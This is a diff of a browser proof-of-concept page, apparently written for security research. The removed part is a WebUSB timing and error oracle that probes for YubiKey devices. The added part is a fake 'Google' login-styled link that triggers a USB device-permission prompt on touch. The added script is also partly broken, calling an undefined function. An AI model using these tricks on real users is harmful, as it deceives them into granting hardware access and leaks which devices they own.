@@ -1,88 +1,79 @@
-<!DOCTYPE html>
+
 <html>
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>WebUSB Oracle PoC</title>
-<style>
-  body { font-family: sans-serif; padding: 20px; background: #111; color: #eee; }
-  button { padding: 12px 24px; font-size: 16px; margin: 8px 4px; border-radius: 8px; border: none; cursor: pointer; }
-  #btn-all { background: #3b82f6; color: white; }
-  #btn-specific { background: #10b981; color: white; }
-  #log { margin-top: 20px; background: #1e1e1e; padding: 16px; border-radius: 8px; font-family: monospace; font-size: 13px; min-height: 120px; white-space: pre-wrap; }
-  .entry { margin-bottom: 6px; }
-  .ts { color: #888; }
-  .err { color: #f87171; }
-  .ok  { color: #34d399; }
-  .info{ color: #60a5fa; }
-</style>
-</head>
-<body>
 
-<h2>WebUSB Device Oracle — PoC</h2>
-<p style="color:#aaa; font-size:13px;">Testing: apakah error message berbeda antara "device ada tapi di-cancel" vs "device tidak ada"</p>
 
-<button id="btn-all" onclick="testFilter('all')">Test: Filter Semua Device (filters:[{}])</button>
-<button id="btn-specific" onclick="testFilter('specific')">Test: Filter Vendor ID Spesifik</button>
-<button id="btn-timing" onclick="testTiming()">Test: Timing Oracle</button>
+<a ontouchstart="y()"  href="data:text/html,https://new.logins.accounts.google.com" > Google</a>
 
-<div id="log">// Log akan muncul di sini...\n</div>
+
+
+</html>
 
 <script>
-function log(msg, cls='info') {
-  const el = document.getElementById('log');
-  const ts = new Date().toISOString().substr(11,12);
-  el.innerHTML += `<div class="entry ${cls}"><span class="ts">[${ts}]</span> ${msg}</div>`;
-}
-
-async function testFilter(mode) {
-  log(`\n=== START TEST: ${mode} ===`);
-
-  let filters;
-  if (mode === 'all') {
-    filters = [{}]; // wildcard - semua device
-  } else {
-    // YubiKey vendor ID = 0x1050, contoh vendor spesifik
-    filters = [{ vendorId: 0x1050 }];
-  }
-
-  const t0 = performance.now();
-
-  try {
-    const device = await navigator.usb.requestDevice({ filters });
-    const elapsed = (performance.now() - t0).toFixed(2);
-    // User klik "Sambungkan" - device granted
-    log(`[GRANTED] Device selected: ${device.productName} (vendor: ${device.vendorId})`, 'ok');
-    log(`[TIME] Response time: ${elapsed}ms`, 'info');
-    log(`[INFO] manufacturerName: ${device.manufacturerName}`, 'info');
-    log(`[INFO] serialNumber: ${device.serialNumber}`, 'info');
-  } catch(err) {
-    const elapsed = (performance.now() - t0).toFixed(2);
-    // Catat EXACT error untuk dibandingkan
-    log(`[ERROR TYPE] ${err.name}`, 'err');
-    log(`[ERROR MSG]  "${err.message}"`, 'err');
-    log(`[ERROR CODE] ${err.code || 'N/A'}`, 'err');
-    log(`[TIME] Response time: ${elapsed}ms`, 'ts');
-  }
-
-  log(`=== END TEST ===\n`);
-}
-
-async function testTiming() {
-  log(`\n=== TIMING ORACLE TEST (5 rounds) ===`);
-  log(`Tujuan: cek apakah timing berbeda saat device ada vs tidak ada`, 'info');
-
-  for (let i = 1; i <= 5; i++) {
-    const t0 = performance.now();
-    try {
-      await navigator.usb.requestDevice({ filters: [{ vendorId: 0x1050 }] });
-      log(`Round ${i}: GRANTED - ${(performance.now()-t0).toFixed(2)}ms`, 'ok');
-    } catch(e) {
-      log(`Round ${i}: ${e.name} | "${e.message}" | ${(performance.now()-t0).toFixed(2)}ms`, 'err');
+var onlongtouch; 
+var timer;
+var touchduration = 1; //length of time we want the user to touch before we do something
+//y();
+function touchstart(e) {
+    y();
+    e.preventDefault();
+    if (!timer) {
+        timer = setTimeout(onlongtouch, touchduration);
     }
-  }
-
-  log(`=== END TIMING TEST ===\n`);
 }
+
+function touchend() {
+    //stops short touches from firing the event
+    if (timer) {
+        clearTimeout(timer);
+        timer = null;
+    }
+}
+
+onlongtouch = function() { 
+    timer = null;
+    //document.getElementById('ping').innerText+='ping\n'; 
+   // document.body.requestFullscreen();
+   //openFullscreen();
+  // y();
+};
+
+function getLocation() {
+//fullscreen();
+
+  //document.getElementById("sf").removeAttribute("disabled");
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+   // document.getElementById("sf").focus()	
+  } else {
+    //x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+  
+}
+
+function y()
+{
+   setTimeout(getUsb,200);
+   
+}
+function getUsb(){
+
+ navigator.usb.requestDevice({filters: [{}]}).then(
+        displayOutcome("usb", "success"),
+        displayOutcome("usb", "error")
+      );
+}
+  
+function showPosition(position) {
+ // x.innerHTML = "Latitude: " + position.coords.latitude +
+ // "<br>Longitude: " + position.coords.longitude;
+}
+
+/*document.addEventListener("DOMContentLoaded", function(event) { 
+    window.addEventListener("touchstart", touchstart, false);
+    window.addEventListener("touchend", touchend, false);
+});
+*/
+
+
+
 </script>
-</body>
-</html>
